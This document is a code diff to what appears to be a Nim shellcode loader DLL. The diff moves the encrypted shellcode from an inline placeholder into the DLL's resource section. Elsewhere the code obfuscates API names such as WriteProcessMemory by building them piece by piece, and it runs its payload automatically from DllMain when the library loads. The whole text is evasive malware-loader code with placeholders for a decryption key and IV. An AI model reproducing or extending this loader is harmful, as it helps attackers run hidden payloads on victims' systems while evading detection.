@@ -8,6 +8,8 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
 
 const KERNEL32_DLL* = "kernel32.dll"
 
+var currentModule: HINSTANCE
+
 var WPM = ""
 WPM.add("Wr")
 WPM.add("it")
@@ -63,7 +65,19 @@ proc ConvertTToF*(lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
-    let shellcode: seq[byte] = REPLACE_ME
+    var resourceId = 100
+    var resourceType = 10
+
+    # Get pointer to encrypted shellcode in .rsrc section
+    var myResource: HRSRC = FindResource(cast[HMODULE](currentModule), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
+
+    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](currentModule), myResource)
+
+    var hResource: HGLOBAL = LoadResource(cast[HMODULE](currentModule), myResource)
+    
+    
+    var oldProtect: DWORD
+    let shellcode: seq[byte] = cast[seq[byte]](hResource)
     let iv = "BLANK_IV"
     let passwd = """BLANK_PASSWORD"""
 
@@ -89,7 +103,7 @@ proc execute(): void =
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
   NimMain()
-  
+  currentModule = hinstDLL
   if fdwReason == DLL_PROCESS_ATTACH:
     execute()
 
